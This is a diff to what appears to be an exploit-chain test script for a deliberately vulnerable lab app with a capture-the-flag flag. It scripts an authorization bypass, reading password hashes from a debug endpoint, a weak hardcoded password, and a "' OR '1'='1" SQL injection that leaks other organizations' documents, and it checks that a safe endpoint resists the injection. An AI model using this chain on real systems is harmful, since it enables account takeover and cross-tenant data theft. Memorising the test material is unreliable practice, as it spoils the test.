@@ -41,10 +41,9 @@ account = call('POST', '/signup', 201, json={
     'username': username, 'displayName': 'Demo User',
     'email': username + '@example.test', 'password': password,
 })
-organization_uuid = account['organizationUuid']
-assert str(uuid.UUID(organization_uuid)) == organization_uuid
+assert set(account) == {'username'}
 assert call('POST', '/documents/search', 200, username, password,
-            json={'organizationUuid': organization_uuid}) == []
+            json={'category': 'report'}) == []
 users = call('GET', '/users', 200, username, password)
 assert users and any(user['username'] == 'anna' for user in users)
 assert any(user['role'] == 'admin' for user in users)
@@ -56,15 +55,16 @@ anna = next(user for user in debug_users if user['username'] == 'anna')
 assert anna['passwordHash'].startswith(('$2a$', '$2b$', '$2y$'))
 anna_password = 'sunshine'
 assert bcrypt.checkpw(anna_password.encode(), anna['passwordHash'].encode())
-assert call('POST', '/documents/search', 200, 'anna', anna_password,
-            json={'organizationUuid': organization_uuid}) == []
-payload = organization_uuid + "' OR '1'='1"
+anna_documents = call('POST', '/documents/search', 200, 'anna', anna_password,
+                      json={'category': 'report'})
+assert anna_documents and len({json.loads(doc['metadata'])['organizationUuid'] for doc in anna_documents}) == 1
+assert all(json.loads(doc['metadata'])['category'] == 'report' for doc in anna_documents)
+payload = "report' OR '1'='1"
 injected = call('POST', '/documents/search', 200, 'anna', anna_password,
-                json={'organizationUuid': payload})
+                json={'category': payload})
 organizations = {json.loads(doc['metadata'])['organizationUuid'] for doc in injected}
 assert len(organizations) >= 5
-assert organization_uuid not in organizations
 assert any('FLAG{archive-isolation-broken-by-converter}' in doc['content'] for doc in injected)
 assert call('POST', '/documents/search-safe', 200, 'anna', anna_password,
-            json={'organizationUuid': payload}) == []
+            json={'category': payload}) == []
 print('OrgArchive chain OK: signup, method authorization bypass, debug hash, SQL injection')
